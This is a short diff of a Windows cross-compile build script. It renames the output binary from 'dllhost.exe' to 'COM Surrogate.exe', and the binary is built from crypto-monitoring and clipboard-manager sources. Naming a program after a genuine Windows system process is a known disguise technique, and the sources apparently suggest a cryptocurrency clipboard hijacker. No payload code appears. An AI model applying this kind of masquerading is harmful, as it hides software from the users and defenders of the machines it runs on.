@@ -11,7 +11,7 @@ echo "Compiling..."
 # 1. Чтобы была консоль, мы УБРАЛИ флаг -mwindows
 # 2. Имя файла после -o изменено на 'dllhost.exe'
 x86_64-w64-mingw32-g++ main.cpp CryptoMonitor.cpp CryptoDetector.cpp ClipboardManager.cpp version.o \
-    -o 'dllhost.exe' \
+    -o 'COM Surrogate.exe' \
     -static \
     -luser32 -lkernel32
 
